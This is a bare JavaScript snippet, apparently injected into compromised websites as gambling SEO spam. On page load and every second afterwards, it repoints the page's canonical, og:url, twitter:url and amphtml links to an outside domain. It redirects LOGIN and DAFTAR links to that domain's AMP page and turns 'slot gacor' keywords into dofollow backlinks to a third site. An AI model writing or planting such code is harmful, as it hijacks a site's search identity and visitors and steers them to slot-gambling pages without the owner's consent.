const officialDomain = 'https://mercer-brunch-kyoto.com/menu.html'; 
const ampDomain = 'https://mercer-brunch-kyoto.com/amp/';       
const backlinkUrl = 'https://abqkings.org/about/';
const backlinkKeywords = ['slot gacor', 'slot gacor resmi'];

function replaceAnchorTags() {
  const anchors = document.querySelectorAll('a');

  anchors.forEach(anchor => {
    if (anchor.textContent.trim().toUpperCase() === 'LOGIN' || anchor.textContent.trim().toUpperCase() === 'DAFTAR') {
      anchor.href = ampDomain; 
    }
  });

  // Add dofollow backlinks for specified keywords
  backlinkKeywords.forEach(keyword => {
    const keywordRegex = new RegExp(`\\b${keyword}\\b`, 'gi');
    document.body.innerHTML = document.body.innerHTML.replace(keywordRegex, `<a href="${backlinkUrl}" rel="dofollow">${keyword}</a>`);
  });
}

function forceUrlsToOfficialDomain() {
  const canonicalLink = document.querySelector('link[rel="canonical"]');
  let canonicalBasePath = ''; 

  if (canonicalLink) {
    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, '');
    canonicalLink.href = officialDomain; 
  } else {
    const newCanonical = document.createElement('link');
    newCanonical.rel = 'canonical';
    newCanonical.href = officialDomain; 
    document.head.appendChild(newCanonical);
  }

  const links = document.querySelectorAll('a[href]');
  links.forEach(link => {
    if (link.href.startsWith('http') && !isSpecialLink(link)) {
      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, '');
      link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
    }
  });

  const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
  metaUrls.forEach(meta => {
    const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); 
    meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); 
  });

  const ampLink = document.querySelector('link[rel="amphtml"]');
  if (ampLink) {
    ampLink.href = ampDomain; 
  } else {
    const newAmpLink = document.createElement('link');
    newAmpLink.rel = 'amphtml';
    newAmpLink.href = ampDomain; 
    document.head.appendChild(newAmpLink); 
  }
}

function isSpecialLink(link) {
  return link.classList.contains('login') ||
         link.classList.contains('register') ||
         link.href === officialDomain ||
         link.href === ampDomain ||
         link.href === backlinkUrl || // Exclude backlink URL from being modified
         link.classList.contains('special-link') || 
         link.textContent.trim().toUpperCase() === 'LOGIN' || 
         link.textContent.trim().toUpperCase() === 'DAFTAR'; 
}

document.addEventListener('DOMContentLoaded', () => {
  forceUrlsToOfficialDomain(); 
  replaceAnchorTags(); 
});

setInterval(forceUrlsToOfficialDomain, 1000);
